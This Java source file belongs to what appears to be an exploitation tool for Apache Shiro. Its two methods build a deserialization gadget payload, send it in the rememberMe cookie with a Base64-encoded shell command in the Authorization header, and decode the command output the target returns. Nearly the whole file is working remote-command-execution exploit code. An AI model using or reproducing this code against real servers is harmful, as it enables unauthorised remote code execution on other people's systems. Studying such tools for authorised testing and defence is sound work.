package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;

import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommandExcute {
    /**
     * 命令执行回显（返回结果）
     * @param targetOBJ 请求对象
     * @param command 执行命令
     * @return 命令执行结果
     */
    public static String commandExcuteWithResult(TargetOBJ targetOBJ, String command) {
        try {
            // 获取payload
            Class<?> gadgetClass = Class.forName("com.y5neko.shiroexp.gadget." + targetOBJ.getGadget());
            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
            String payload = (String) method.invoke(null, targetOBJ.getEcho(), targetOBJ.getKey(), targetOBJ.getCryptType());

            // 生成命令（使用UTF-8编码）
            command = Base64.getEncoder().encodeToString(command.getBytes("UTF-8"));
            Map<String, String> headers = new HashMap<>();
            headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
            headers.put("Authorization", "Basic " + command);

            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, null, headers, "GET");

            // 解码响应（优先使用UTF-8）
            byte[] responseBytes = Base64.getDecoder().decode(Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse())));
            String result = new String(responseBytes, "UTF-8");

            // 移除 ANSI 转义字符，用于 GUI 显示
            return Tools.stripAnsiCodes(result);
        } catch (IndexOutOfBoundsException e) {
            return Tools.stripAnsiCodes(Log.buffer_logging("NULL", "无回显"));
        }
        catch (Exception e) {
            return Tools.stripAnsiCodes(Log.buffer_logging("EROR", e.getMessage()));
        }
    }

    /**
     * 命令执行回显
     * @param targetOBJ 请求对象
     * @param command 执行命令
     */
    public static void commandExcute(TargetOBJ targetOBJ, String command) {
        try {
            // 获取payload
            Class<?> gadgetClass = Class.forName("com.y5neko.shiroexp.gadget." + targetOBJ.getGadget());
            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
            String payload = (String) method.invoke(null, targetOBJ.getEcho(), targetOBJ.getKey(), targetOBJ.getCryptType());

            // 生成命令（使用UTF-8编码）
            command = Base64.getEncoder().encodeToString(command.getBytes("UTF-8"));
            Map<String, String> headers = new HashMap<>();
            headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
            headers.put("Authorization", "Basic " + command);

            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, null, headers, "GET");

            // 解码响应（优先使用UTF-8）
            byte[] responseBytes = Base64.getDecoder().decode(Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse())));
            String result = new String(responseBytes, "UTF-8");

            // CLI 模式保留颜色
            System.out.println("----------");
            System.out.println(result);
            System.out.println("----------");
        } catch (IndexOutOfBoundsException e) {
            System.out.println(Log.buffer_logging("NULL", "无回显"));
        }
        catch (Exception e) {
            System.out.println(Log.buffer_logging("EROR", e.getMessage()));
        }
    }
}
